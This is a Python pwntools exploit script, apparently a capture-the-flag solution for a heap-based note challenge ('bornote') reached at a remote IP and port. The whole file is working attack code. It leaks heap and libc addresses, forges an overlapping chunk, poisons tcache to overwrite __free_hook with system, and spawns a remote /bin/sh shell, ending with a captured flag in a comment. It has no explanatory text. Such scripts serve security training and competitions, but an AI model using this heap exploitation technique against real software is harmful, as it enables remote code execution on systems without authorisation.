from pwn import *

#context.log_level = 'debug'

p = remote('121.36.250.162','49153')
#p = process('./bornote')
elf = ELF('./bornote')
#libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
libc = ELF('./libc-2.31.so')

def init():
    p.sendlineafter('username: ','A'*0x8)

def cmd(ch):
    p.sendlineafter(' cmd: ',str(ch))

def add(size):
    cmd(1)
    p.sendlineafter('Size: ',str(size))

def free(idx):
    cmd(2)
    p.sendlineafter('Index: ',str(idx))

def edit(idx,con):
    cmd(3)
    p.sendlineafter('Index: ',str(idx))
    p.sendafter('Note: ',con)

def show(idx):
    cmd(4)
    p.sendlineafter('Index: ',str(idx))

init()
for i in range(10):
    add(0xf8)
for i in range(7):
    free(9-i)

add(0xf8)
show(3)
p.recvuntil('Note: ')
heap = u64(p.recv(6)+b'\x00\x00')
p.info('heap: '+hex(heap))
free(3)

edit(1,b'a'*0xf0 + p64(0x1f0))
fake = p64(0x0)+p64(0x1f1)+p64(heap-0x400)+p64(heap-0x400)
edit(0,fake+b'\n')
free(2)

add(0xf8) #2
free(1)
add(0x108) #1
show(1)
p.recvuntil('Note: ')
libc_base = u64(p.recv(6)+b'\x00\x00')-0x1ebec0
p.info('libc_base: '+hex(libc_base))
free_hook = libc_base + libc.sym['__free_hook']
system = libc_base + libc.sym['system']

pay = b'A'*0xe8+p64(0x101)+p64(free_hook-0x8)
edit(1,pay+b'\n')


add(0xf8) #3
add(0xf8) #4
edit(4,b'/bin/sh\x00'+p64(system)+b'\n')
free(4)

#gdb.attach(p)
p.interactive()
#flag{d483f651c1cbcad9a7bb87d04d498ea7}

